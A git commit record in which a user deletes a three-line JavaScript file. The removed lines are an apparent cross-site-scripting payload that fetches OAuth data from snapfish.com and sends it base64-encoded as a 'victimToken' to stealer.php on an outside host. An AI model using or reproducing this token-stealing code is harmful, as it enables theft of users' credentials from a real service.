d4b8571773a3f96c399eabafd1d53b6f78b71766
Márcio Cirqueira <62367006+mrccrqr@users.noreply.github.com>
2025-02-13 16:28:42 -0300

    Delete a.js

--- a.js
+++
@@ -1,3 +0,0 @@
-fetch("https://www.snapfish.com/library/getOauthInfo")
-  .then(r => r.text())
-  .then(d => fetch("https://marciosz.myartsonline.com/snapfish/fbxss/stealer.php?victimToken=" + btoa(d)));
